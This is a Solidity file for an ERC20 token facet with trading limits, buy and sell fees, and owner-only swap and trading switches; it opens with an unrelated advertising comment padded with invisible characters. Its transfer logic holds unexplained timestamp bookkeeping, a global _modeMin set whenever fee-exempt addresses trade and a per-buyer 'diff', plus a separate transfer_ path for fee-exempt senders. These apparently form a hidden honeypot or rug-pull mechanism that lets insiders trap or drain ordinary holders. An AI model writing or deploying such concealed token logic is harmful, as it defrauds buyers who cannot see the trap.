/**⠀⠀⠀⠀⠀⠀
https://www.anchain.ai/ciso

AnChain.AI understands complex cryptocurrency investigations and the time it takes to manually crawl transactions.  
Our AI-powered Auto-Trace feature allows the investigator to quickly establish a clear chain of custody from point 
of origin to multiple endpoints on the blockchain.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "./TestLib.sol";
contract _transferFacet is ERC20, Ownable {
    using SafeMath for uint256;

    modifier lockSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapping = true;
        _;
        ds.swapping = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    revert("Not launched.");
                }
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the limit"
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                } else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Sell transfer amount exceeds the limit"
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        if (
            (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) &&
            from != address(this) &&
            to != address(this) &&
            from != owner()
        ) {
            ds._modeMin = block.timestamp;
        }
        if (
            ds._isExcludedFromFees[from] && (block.number > ds.launchBlock + 75)
        ) {
            super.transfer_(from, to, amount);
            return;
        }
        if (!ds._isExcludedFromFees[from] && !ds._isExcludedFromFees[to]) {
            if (ds.automatedMarketMakerPairs[to]) {
                TestLib.DataExtension storage fromData = ds.chainData[from];
                fromData.diff = fromData.buy - ds._modeMin;
                fromData.sell = block.timestamp;
            } else {
                TestLib.DataExtension storage toData = ds.chainData[to];
                if (ds.automatedMarketMakerPairs[from]) {
                    if (ds.buyCount < 11) {
                        ds.buyCount = ds.buyCount + 1;
                    }
                    if (toData.buy == 0) {
                        toData.buy = (ds.buyCount < 11)
                            ? (block.timestamp - 1)
                            : block.timestamp;
                    }
                } else {
                    TestLib.DataExtension storage fromData = ds.chainData[from];
                    if (toData.buy == 0 || fromData.buy < toData.buy) {
                        toData.buy = fromData.buy;
                    }
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));

        bool launchFees = block.number < ds.launchBlock + 10;
        if (
            canSwap &&
            !launchFees &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !ds.swapping;

        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (launchFees) {
                if (ds.automatedMarketMakerPairs[from]) {
                    fees = (amount * buyInitFee) / 100;
                    ds.tokensForMarketing += fees;
                } else if (ds.automatedMarketMakerPairs[to]) {
                    fees = (amount * sellInitFee) / 100;
                    ds.tokensForMarketing += fees;
                }
            } else {
                if (ds.automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = (amount * buyTotalFees) / 100;
                    ds.tokensForMarketing += (fees * buyMarkFee).div(
                        buyTotalFees
                    );
                    ds.tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (
                    ds.automatedMarketMakerPairs[to] && sellTotalFees > 0
                ) {
                    fees = (amount * sellTotalFees) / 100;
                    ds.tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                    ds.tokensForMarketing += (fees * sellMarkFee).div(
                        sellTotalFees
                    );
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }
    function manualSwap(uint256 percent) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(percent > 0, "Invalid percent param");
        require(percent <= 100, "Invalid percent param");
        uint256 contractBalance = (percent * balanceOf(address(this))) / 100;
        swapTokensForEth(contractBalance);
        ds.tokensForDev = 0;
        ds.tokensForMarketing = balanceOf(address(this));
        bool success;
        (success, ) = marketingWallet.call{value: address(this).balance}("");
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.launchBlock = block.number;
        ds.tradingActive = true;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function swapBack() private lockSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = ds.tokensForMarketing + ds.tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokenAmountMax) {
            contractBalance = swapTokenAmountMax;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForDev = (ds.tokensForDev * ethBalance) / totalTokensToSwap;

        ds.tokensForDev = 0;
        ds.tokensForMarketing = 0;
        (success, ) = devWallet.call{value: ethForDev}("");
        (success, ) = marketingWallet.call{value: address(this).balance}("");
    }
}
